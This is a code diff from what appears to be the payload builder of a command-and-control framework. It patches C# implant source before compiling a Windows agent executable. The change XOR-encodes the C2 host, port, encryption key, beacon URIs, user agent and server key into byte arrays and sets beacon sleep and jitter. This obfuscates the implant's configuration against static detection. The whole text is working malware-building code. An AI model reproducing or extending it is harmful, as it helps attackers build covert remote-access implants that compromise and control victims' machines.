@@ -1728,33 +1728,52 @@ def {cmd_func}(cmd):
 
         scheme = transport if transport in ('http', 'https') else 'http'
 
-        with open(cs_src, 'r') as f:
-            src = f.read()
-
+        import re, shutil
         from crypto.handshake import ServerIdentity
         server_pub_hex = ServerIdentity.load().pub.hex()
 
-        replacements = {
-            '{{C2_HOST}}': c2_host, '{{C2_PORT}}': str(c2_port),
-            '{{C2_SCHEME}}': scheme, '{{ENCRYPTION_KEY}}': encryption_key,
-            '{{BEACON_INTERVAL}}': str(beacon_interval), '{{BEACON_JITTER}}': str(beacon_jitter),
-            '{{REGISTER_URI}}': uris['register'], '{{CHECKIN_URI}}': uris['checkin'],
-            '{{RESULT_URI}}': uris['results'], '{{USER_AGENT}}': ua,
-            '{{KILL_DATE}}': '0', '{{WORK_START}}': '0', '{{WORK_END}}': '24',
-            '{{SERVER_PUB}}': server_pub_hex,
+        def xor_encode(s, key=0x5A):
+            return '{ ' + ', '.join(f'0x{b ^ key:02X}' for b in s.encode()) + ' }'
+
+        byte_replacements = {
+            '_ch': c2_host,
+            '_cp': str(c2_port),
+            '_cs': scheme,
+            '_ek': encryption_key,
+            '_ru': uris['register'],
+            '_cu': uris['checkin'],
+            '_ua': ua,
+            '_sp': server_pub_hex,
         }
 
-        import shutil
+        int_replacements = {
+            'BeaconSleep': str(beacon_interval),
+            'BeaconJitter': str(beacon_jitter),
+        }
+
         cs_files = list(cs_src.parent.glob('*.cs'))
         backups = {}
         for csf in cs_files:
-            src_text = csf.read_text()
-            for k, v in replacements.items():
-                src_text = src_text.replace(k, v)
-            backup_path = csf.with_suffix('.cs.bak')
-            shutil.copy(csf, backup_path)
-            backups[csf] = backup_path
-            csf.write_text(src_text)
+            src_text = csf.read_text(errors='replace')
+            changed = False
+            for var, val in byte_replacements.items():
+                pattern = rf'(static\s+byte\[\]\s+{re.escape(var)}\s*=\s*)\{{[^}}]+\}}'
+                replacement = rf'\g<1>{xor_encode(val)}'
+                new_text = re.sub(pattern, replacement, src_text)
+                if new_text != src_text:
+                    src_text = new_text
+                    changed = True
+            for var, val in int_replacements.items():
+                pattern = rf'(static\s+int\s+{re.escape(var)}\s*=\s*)\d+'
+                new_text = re.sub(pattern, rf'\g<1>{val}', src_text)
+                if new_text != src_text:
+                    src_text = new_text
+                    changed = True
+            if changed:
+                backup_path = csf.with_suffix('.cs.bak')
+                shutil.copy(csf, backup_path)
+                backups[csf] = backup_path
+                csf.write_text(src_text)
 
         out_name = f"agent_{self.random_string(8)}_windows.exe"
         print(f"[*] Building C# agent for Windows x64 (framework-dependent)...")
